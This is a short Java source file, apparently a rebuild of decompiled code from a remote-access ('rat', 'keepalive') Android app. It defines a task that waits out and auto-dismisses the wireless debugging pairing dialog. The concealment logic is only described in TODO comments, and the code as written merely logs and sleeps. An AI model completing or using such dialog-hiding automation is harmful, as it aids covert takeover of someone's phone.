package com.vendor.rat.keepalive.thread;

import android.util.Log;

import java.util.concurrent.Callable;

/**
 * Vendor: com.guard.wallet.thread.g
 * Dismisses wireless pairing dialog after pairing ends.
 */
public final class WirelessPairDismissTask implements Callable<Boolean> {

    private static final String TAG = "WirelessPairDismissTask";
    private final boolean paired;
    // ADAPT: vendor uses o.a0 (AutoEngine)
    private final Object autoEngine;

    public WirelessPairDismissTask(boolean paired, Object autoEngine) {
        this.paired = paired;
        this.autoEngine = autoEngine;
    }

    /**
     * Vendor: g.call()
     * If paired, waits for pairing dialog to close (up to 5 retries).
     * Then tries to click cancel button if dialog still showing.
     */
    @Override
    public Boolean call() {
        int retryCount = 0;
        // Phase 1: if paired, wait for dialog auto-close
        while (paired && retryCount < 5) {
            // TODO: VENDOR_VERIFY - vendor checks a0Var.M() (isDialogShowing)
            Log.e(TAG, "无线配对成功,仍然停留在配对对话框,等待自动关闭");
            retryCount++;
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
        // Phase 2: try clicking cancel button
        int cancelRetry = 0;
        while (cancelRetry <= 5) {
            // TODO: VENDOR_VERIFY - vendor builds CombineFilter for cancel button
            // finds button with text from TextConfig PAIR_CANCEL_TEXT, clicks it
            Log.d(TAG, "无线配对已结束,等待5秒后,仍然停留在配对对话框");
            cancelRetry++;
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
        return Boolean.TRUE;
    }
}
